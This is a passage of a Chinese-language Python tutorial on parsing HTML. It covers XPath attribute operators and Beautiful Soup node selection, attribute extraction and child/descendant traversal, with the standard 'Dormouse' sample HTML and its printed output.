<h2 id="多属性匹配"><a href="#多属性匹配" class="headerlink" title="多属性匹配"></a>多属性匹配</h2><p>还要一种情况就是多个属性确定一个节点，这个时候就需要使用and运算符来连接<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">text=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;li class="li li-first" name="item"&gt;&lt;a href="link.html"&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">html=etree.HTML(text)</span><br><span class="line">result=html.xpath(<span class="string">'//li[contains(@class,"li") and @name="item"]/a/text()'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><br>这里li又增加了一个属性name。要确定就需要同时根据class和name属性来选择，一个条件是class中的li字符串，一个是name属性为item字符串</p>
<p>除了and，XPath还有很多运算符</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
<th>返回值 </th>
</tr>
</thead>
<tbody>
<tr>
<td>or</td>
<td>或</td>
<td>age=19 or age=20</td>
<td>如果age=19，则返回true。如果是age=21，则返回false</td>
</tr>
<tr>
<td>and</td>
<td>与</td>
<td>age&gt;19 and age&lt;21</td>
<td>如果age=20，则返回true</td>
</tr>
<tr>
<td>mod</td>
<td>计算除法的余数</td>
<td>5 mod 2</td>
<td>1</td>
</tr>
<tr>
<td>+</td>
<td>加法</td>
<td>6+4</td>
<td>10</td>
</tr>
<tr>
<td>-</td>
<td>减法</td>
<td>6-4</td>
<td>2</td>
</tr>
<tr>
<td>*</td>
<td>乘法</td>
<td>6*4</td>
<td>24</td>
</tr>
<tr>
<td>div</td>
<td>除法</td>
<td>8 div 4</td>
<td>2</td>
</tr>
<tr>
<td>=</td>
<td>等于</td>
<td>age=19</td>
<td>age=19，则返回true</td>
</tr>
</tbody>
</table>
</div>
<p>大于小于，小于（大于）等于，不等于用法与以往相同 不多介绍</p>
<h1 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h1><p>Beautiful Soup和XPath类似，也是一个解析库，但是相比较XPath更加方便快捷</p>
<p>Beautiful Soup会自动将输入文档转换为Unicode编码，输出文档转换为UTF-8编码，你不需要考虑编码方式，除非文档没有指定编码方式</p>
<h2 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h2><div class="table-container">
<table>
<thead>
<tr>
<th>解析器</th>
<th>使用方法</th>
<th>优势</th>
<th>劣势 </th>
</tr>
</thead>
<tbody>
<tr>
<td>Python标准库</td>
<td>BeautifulSoup(markup,”html.parser”)</td>
<td>Python的内置标准库，执行速度适中，文档容错率强</td>
<td>Python2.7.3及Python3.2.2之前的版本容错率差</td>
</tr>
<tr>
<td>lxml HTML解析库</td>
<td>BeautifulSoup(markup,”lxml”)</td>
<td>速度快，文档容错能力强</td>
<td>需要安装C语言库</td>
</tr>
<tr>
<td>lxml XML解析器</td>
<td>BeautifulSoup(markup,”xml”)</td>
<td>速度快，唯一支持XML的解析器</td>
<td>需要安装C语言库</td>
</tr>
<tr>
<td>html5lib</td>
<td>BeautifulSoup(markup,”html5lib”)</td>
<td>最好的容错性，以浏览器方式解析文档，生成HTML5格式的文档</td>
<td>速度慢，不依赖外部扩展</td>
</tr>
</tbody>
</table>
</div>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = """</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"title"</span> <span class="attr">name</span>=<span class="string">"dromouse"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>Once upon a time there were three little sisters; and their names were</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span><span class="comment">&lt;!-- Elsie --&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>,</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/lacie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link2"</span>&gt;</span>Lacie<span class="tag">&lt;/<span class="name">a</span>&gt;</span> and</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/tillie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link3"</span>&gt;</span>Tillie<span class="tag">&lt;/<span class="name">a</span>&gt;</span>;</span><br><span class="line">and they lived at the bottom of a well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">"""</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line">print(soup.prettify())</span><br><span class="line">print(soup.title.string)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">   The Dormouse's story</span><br><span class="line">  <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"title"</span> <span class="attr">name</span>=<span class="string">"dromouse"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">b</span>&gt;</span></span><br><span class="line">    The Dormouse's story</span><br><span class="line">   <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line">   Once upon a time there were three little sisters; and their names were</span><br><span class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Elsie --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">   ,</span><br><span class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/lacie"</span> <span class="attr">id</span>=<span class="string">"link2"</span>&gt;</span></span><br><span class="line">    Lacie</span><br><span class="line">   <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">   and</span><br><span class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/tillie"</span> <span class="attr">id</span>=<span class="string">"link3"</span>&gt;</span></span><br><span class="line">    Tillie</span><br><span class="line">   <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">   ;</span><br><span class="line">and they lived at the bottom of a well.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line">   ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">The Dormouse's story</span><br></pre></td></tr></table></figure>
<p>prettify()方法可以把要解析的字符串以标准的缩进格式输出，这里可以看到输出结果中包括了body和html节点，说明了Beautiful Soup可以自动更正格式</p>
<p>soup.tile可以选出HTML中的title节点，string属性可以直接得到里面的文本</p>
<h2 id="节点选择器"><a href="#节点选择器" class="headerlink" title="节点选择器"></a>节点选择器</h2><p>直接调用节点的名称就可以选择节点元素，再调用string属性就可以得到节点内的文本</p>
<h3 id="选择元素"><a href="#选择元素" class="headerlink" title="选择元素"></a>选择元素</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = """</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"title"</span> <span class="attr">name</span>=<span class="string">"dromouse"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>Once upon a time there were three little sisters; and their names were</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span><span class="comment">&lt;!-- Elsie --&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>,</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/lacie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link2"</span>&gt;</span>Lacie<span class="tag">&lt;/<span class="name">a</span>&gt;</span> and</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/tillie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link3"</span>&gt;</span>Tillie<span class="tag">&lt;/<span class="name">a</span>&gt;</span>;</span><br><span class="line">and they lived at the bottom of a well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">"""</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line">print(soup.title)</span><br><span class="line">print(type(soup.title))</span><br><span class="line">print(soup.title.string)</span><br><span class="line">print(soup.head)</span><br><span class="line">print(soup.p)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">bs4.element.Tag</span>'&gt;</span></span><br><span class="line">The Dormouse's story</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"title"</span> <span class="attr">name</span>=<span class="string">"dromouse"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>打印title节点的选择结果，输出结果就是title节点家里面的文字内容，类型是bs4.element.Tag类型，这是Beautiful Soup中一个重要的数据结构，经过选择器选择后结果都是这种Tag类型，Tag类型具有一些属性，例如string</p>
<p>我们还注意到，只输出了一个p标签的内容，可以得到这种选择方式只会选择到第一个匹配的节点</p>
<h3 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h3><p>使用string属性可以获取文本的值，节点属性的值有几种获取方法：</p>
<h4 id="获取名称"><a href="#获取名称" class="headerlink" title="获取名称"></a>获取名称</h4><p>使用name属性获取节点的名称，选取title节点，然后调用name属性就可以获得节点名称<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = """</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"title"</span> <span class="attr">name</span>=<span class="string">"dromouse"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>Once upon a time there were three little sisters; and their names were</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span><span class="comment">&lt;!-- Elsie --&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>,</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/lacie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link2"</span>&gt;</span>Lacie<span class="tag">&lt;/<span class="name">a</span>&gt;</span> and</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/tillie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link3"</span>&gt;</span>Tillie<span class="tag">&lt;/<span class="name">a</span>&gt;</span>;</span><br><span class="line">and they lived at the bottom of a well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">"""</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line">print(soup.title.name)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">title</span><br></pre></td></tr></table></figure></p>
<h4 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h4><p>每个节点可能有多个属性，比如id和class等，选择这个节点元素后，调用attrs获取所有的属性<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">html = """</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"title"</span> <span class="attr">name</span>=<span class="string">"dromouse"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span><span class="comment">&lt;!-- Elsie --&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>,</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/lacie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link2"</span>&gt;</span>Lacie<span class="tag">&lt;/<span class="name">a</span>&gt;</span> and</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/tillie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link3"</span>&gt;</span>Tillie<span class="tag">&lt;/<span class="name">a</span>&gt;</span>;</span></span><br><span class="line"><span class="xml">and they lived at the bottom of a well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">"""</span></span><br><span class="line"><span class="xml">from bs4 import BeautifulSoup</span></span><br><span class="line"><span class="xml">soup = BeautifulSoup(html, 'lxml')</span></span><br><span class="line"><span class="xml">print(soup.p.attrs)</span></span><br><span class="line"><span class="xml">print(soup.p.attrs['name'])</span></span><br><span class="line"></span><br><span class="line"><span class="xml">输出结果：</span></span><br><span class="line"><span class="template-variable">&#123;'class': ['title'], 'name': 'dromouse'&#125;</span></span><br><span class="line"><span class="xml">dromouse</span></span><br></pre></td></tr></table></figure><br>可以看到attrs返回结果是字典类型</p>
<p>还有一种更简单的获取方式，不用attrs<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">print</span><span class="params">(soup.p[<span class="string">'name'</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(soup.p[<span class="string">'class'</span>])</span></span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">dromouse</span><br><span class="line">[<span class="string">'title'</span>]</span><br></pre></td></tr></table></figure><br>由于一个节点元素可有多个class,所以class返回的是列表</p>
<h3 id="嵌套选择"><a href="#嵌套选择" class="headerlink" title="嵌套选择"></a>嵌套选择</h3><p>我们如果想获取head节点元素中的head元素，就可以使用嵌套查询，很简单，就是在选中元素上再选中元素<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">html = """</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">"""</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.head.title)</span><br><span class="line">print(<span class="keyword">type</span>(soup.head.title))</span><br><span class="line">print(soup.head.title.string)</span><br><span class="line"></span><br><span class="line">输出结果;</span><br><span class="line">&lt;title&gt;The Dormous<span class="string">e's story&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;class '</span>bs4.element.Tag<span class="string">'&gt;</span></span><br><span class="line"><span class="string">The Dormouse'</span>s story</span><br></pre></td></tr></table></figure></p>
<p>这样就实现了嵌套选择节点</p>
<h3 id="关联选择"><a href="#关联选择" class="headerlink" title="关联选择"></a>关联选择</h3><p>有时候不能一步选到想要的节点元素，需要先选中某一个节点元素，然后以它为基准再选择它的子节点，父节点，兄弟节点等</p>
<h4 id="子节点和子孙节点"><a href="#子节点和子孙节点" class="headerlink" title="子节点和子孙节点"></a>子节点和子孙节点</h4><p>选取节点元素后，想要获取它的子节点和子孙节点可以调用contents属性<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = """</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line">            Once upon a time there were three little sisters; and their names were</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/lacie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link2"</span>&gt;</span>Lacie<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            and</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/tillie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link3"</span>&gt;</span>Tillie<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            and they lived at the bottom of a well.</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">"""</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup=BeautifulSoup(html,'lxml')</span><br><span class="line">print(soup.p.contents)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">['\n            Once upon a time there were three little sisters; and their names were\n            ', <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span>, '\n', <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/lacie"</span> <span class="attr">id</span>=<span class="string">"link2"</span>&gt;</span>Lacie<span class="tag">&lt;/<span class="name">a</span>&gt;</span>, '\n            and\n            ', <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/tillie"</span> <span class="attr">id</span>=<span class="string">"link3"</span>&gt;</span>Tillie<span class="tag">&lt;/<span class="name">a</span>&gt;</span>, '\n            and they lived at the bottom of a well.\n        ']</span><br></pre></td></tr></table></figure><br>可以看到返回结果是列表形式，p节点中既包含文本，又包含节点，最后会将把他们以列表形式统一返回，值得注意的是列表中的每个元素都是p节点的直接子节点，content属性返回的结果是直接子节点的列表</p>
<p>我们还可以使用children属性获得相应的结果<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">from</span> bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.p.children)</span><br><span class="line"><span class="keyword">for</span> i, child <span class="keyword">in</span> enumerate(soup.p.children):</span><br><span class="line">    print(i, child)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;list_iterator object <span class="keyword">at</span> <span class="number">0x000002711FDF8520</span>&gt;</span><br><span class="line"><span class="number">0</span> </span><br><span class="line">            Once upon <span class="keyword">a</span> <span class="built_in">time</span> there were <span class="literal">three</span> little sisters; <span class="keyword">and</span> their names were</span><br><span class="line">            </span><br><span class="line"><span class="number">1</span> &lt;<span class="keyword">a</span> class=<span class="string">"sister"</span> href=<span class="string">"http://example.com/elsie"</span> id=<span class="string">"link1"</span>&gt;</span><br><span class="line">&lt;span&gt;Elsie&lt;/span&gt;</span><br><span class="line">&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"><span class="number">2</span> </span><br><span class="line"></span><br><span class="line"><span class="number">3</span> &lt;<span class="keyword">a</span> class=<span class="string">"sister"</span> href=<span class="string">"http://example.com/lacie"</span> id=<span class="string">"link2"</span>&gt;Lacie&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"><span class="number">4</span> </span><br><span class="line">            <span class="keyword">and</span></span><br><span class="line">            </span><br><span class="line"><span class="number">5</span> &lt;<span class="keyword">a</span> class=<span class="string">"sister"</span> href=<span class="string">"http://example.com/tillie"</span> id=<span class="string">"link3"</span>&gt;Tillie&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"><span class="number">6</span> </span><br><span class="line">            <span class="keyword">and</span> they lived <span class="keyword">at</span> <span class="keyword">the</span> bottom <span class="keyword">of</span> <span class="keyword">a</span> well.</span><br></pre></td></tr></table></figure><br>同样是HTML文本，children属性来选择，返回结果是生成器类型</p>
<p>如果想要得到所有的子孙节点，可以调用descendants属性：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">from</span> bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.p.descendants)</span><br><span class="line"><span class="keyword">for</span> i, child <span class="keyword">in</span> enumerate(soup.p.descendants):</span><br><span class="line">    print(i, child)</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">&lt;generator object Tag.descendants <span class="keyword">at</span> <span class="number">0x000002005FC8AC10</span>&gt;</span><br><span class="line"><span class="number">0</span> </span><br><span class="line">            Once upon <span class="keyword">a</span> <span class="built_in">time</span> there were <span class="literal">three</span> little sisters; <span class="keyword">and</span> their names were</span><br><span class="line">            </span><br><span class="line"><span class="number">1</span> &lt;<span class="keyword">a</span> class=<span class="string">"sister"</span> href=<span class="string">"http://example.com/elsie"</span> id=<span class="string">"link1"</span>&gt;</span><br><span class="line">&lt;span&gt;Elsie&lt;/span&gt;</span><br><span class="line">&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"><span class="number">2</span> </span><br><span class="line"></span><br><span class="line"><span class="number">3</span> &lt;span&gt;Elsie&lt;/span&gt;</span><br><span class="line"><span class="number">4</span> Elsie</span><br><span class="line"><span class="number">5</span> </span><br><span class="line"></span><br><span class="line"><span class="number">6</span> </span><br><span class="line"></span><br><span class="line"><span class="number">7</span> &lt;<span class="keyword">a</span> class=<span class="string">"sister"</span> href=<span class="string">"http://example.com/lacie"</span> id=<span class="string">"link2"</span>&gt;Lacie&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"><span class="number">8</span> Lacie</span><br><span class="line"><span class="number">9</span> </span><br><span class="line">            <span class="keyword">and</span></span><br><span class="line">            </span><br><span class="line"><span class="number">10</span> &lt;<span class="keyword">a</span> class=<span class="string">"sister"</span> href=<span class="string">"http://example.com/tillie"</span> id=<span class="string">"link3"</span>&gt;Tillie&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"><span class="number">11</span> Tillie</span><br><span class="line"><span class="number">12</span> </span><br><span class="line">            <span class="keyword">and</span> they lived <span class="keyword">at</span> <span class="keyword">the</span> bottom <span class="keyword">of</span> <span class="keyword">a</span> well.</span><br></pre></td></tr></table></figure><br>我们可以看到这次输出结果就包含了span节点，也就是输出了所有子节点，包括子孙节点</p>
